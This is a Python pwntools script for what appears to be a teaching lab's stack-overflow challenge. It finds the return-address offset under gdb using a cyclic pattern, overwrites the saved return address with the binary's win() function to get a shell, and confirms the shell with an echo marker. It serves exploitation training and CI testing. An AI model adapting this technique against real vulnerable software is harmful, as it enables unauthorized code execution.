#!/usr/bin/env python3
"""ch05-stack ret2win: overwrite greet()'s saved return address with win().
Discovers the offset at runtime (cyclic pattern + core dump) instead of
hardcoding it, so the same script works unchanged on the AArch64 build
(saved x30, offset 80). `make test` runs this and asserts a real shell."""
import os
import re
import subprocess
import sys
import tempfile
from pwn import *

BIN = sys.argv[1] if len(sys.argv) > 1 else './vuln-x86_64'
context.binary = elf = ELF(BIN)                     # ❶ arch/bits/endian from the ELF
context.log_level = 'warning'
WIN = elf.symbols['win']                            # ❷ no-PIE: a fixed address

def _capture_from_gdb(pattern):
    """Read the crash state live under gdb instead of from a core file, so the
    discovered offset does not depend on RLIMIT_CORE / kernel.core_pattern
    (which differ between the lab image and CI). Same De Bruijn pattern, same
    cyclic_find -- we just read the register state at the fault under gdb.
    Returns the bytes the saved return slot was overwritten
    with (the pattern qword sitting at $sp on x86-64; the hijacked $pc, loaded
    from the saved x30, on AArch64)."""
    with tempfile.NamedTemporaryFile(prefix='ch05pat.', delete=False) as f:
        f.write(pattern)
        patfile = f.name
    try:
        inspect = 'printf "CAP:%p\\n", $pc' if context.arch == 'aarch64' \
                  else 'x/gx $sp'
        out = subprocess.run(
            ['gdb', '-nx', '-q', '-batch',
             '-ex', 'run < ' + patfile,
             '-ex', 'echo CAPSTART\n', '-ex', inspect, '-ex', 'echo CAPEND\n',
             os.path.abspath(BIN)],
            capture_output=True).stdout.decode('latin-1')
    finally:
        os.unlink(patfile)
    seg = out.split('CAPSTART', 1)[1].split('CAPEND', 1)[0]
    val = int(re.search(r'(0x[0-9a-fA-F]+)', seg.split(':', 1)[-1]).group(1), 16)
    return pack(val)

def find_offset():
    """Crash greet() with a De Bruijn pattern and recover the offset to the
    saved return address from the live crash state under gdb.

    We deliberately do NOT use a core dump: whether one is produced, and where,
    depends on RLIMIT_CORE and kernel.core_pattern, which differ between the
    pinned lab image (cores disabled -> no core) and the CI runner (cores
    enabled -> a core whose layout made the old corefile read return the wrong
    offset, so the exploit missed and the whole test went red). gdb reproduces
    the identical crash on the byte-identical binary in both places, so the
    discovered offset is deterministic everywhere. It is still discovered at
    runtime (cyclic + cyclic_find), never hardcoded."""
    captured = _capture_from_gdb(cyclic(256, n=context.bytes))   # ❸
    return cyclic_find(captured, n=context.bytes)                # ❹

def exploit(offset):
    if context.arch == 'aarch64':
        chain = flat({offset: WIN}, filler=b'A')    # ❻ no movaps alignment issue
    else:
        ret = ROP(elf).find_gadget(['ret'])[0]      # ❼ realign for system()'s movaps
        chain = flat({offset: [ret, WIN]}, filler=b'A')
    io = process(BIN)
    io.sendafter(b'name> ', chain)
    io.sendline(b'echo PWNED_$((13*3))')            # ❽ prove the shell executes
    io.recvuntil(b'PWNED_39', timeout=5)            # ❾ raises EOFError if no shell
    with context.local(log_level='info'):          # ❿ keep the marker visible past 'warning'
        log.success('%s: ret2win OK at offset %d', BIN, offset)
    io.close()

if __name__ == '__main__':
    exploit(find_offset())
